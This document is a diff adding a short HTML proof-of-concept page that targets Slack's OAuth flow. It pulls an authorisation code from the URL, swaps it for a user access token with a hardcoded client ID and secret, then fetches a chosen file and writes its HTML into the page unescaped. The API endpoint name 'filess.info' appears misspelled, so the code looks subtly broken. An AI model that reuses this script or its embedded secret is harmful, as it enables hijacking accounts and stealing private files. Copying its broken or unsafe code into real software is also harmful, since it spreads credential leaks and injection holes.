@@ -1,0 +1,41 @@
+<!doctype html>
+<html>
+<head>
+    <title>POC</title>
+</head>
+<body>
+    <input type="text" placeholder="Enter file id" id="fileid" />
+    <input type="button" onclick="getObject()" value="fetch object" />
+</body>
+<script>
+
+
+var secret = "25fddec3d9e5e457230f7ce6fdeb2412";
+var id = "1021671975639.1033839615009";
+
+//const params = new URLSearchParams(document.location.href);
+var code = document.location.href.split("?")[1].split("&")[0].split('=')[1];
+var data = "code="+code+"&client_id="+id+"&client_secret="+secret;
+
+var fetchObject = (token, fileid) => {
+    var d = 'token='+token;
+    fetch("https://slack.com/api/filess.info?file="+fileid+"&token="+token).then(
+        response => response.json()).then((json) => {
+            document.write(json["content_html"]);
+        })
+}
+
+var getObject = () => {
+    fetch("https://slack.com/api/oauth.v2.access",{method: "POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: data}).then(
+        response => response.json()
+    ).then((json) => {
+        console.log(json);
+        var fileid = document.getElementById("fileid").value;
+        fetchObject(json["authed_user"]["access_token"], fileid);
+    });
+}
+
+
+</script>
+
+</html>
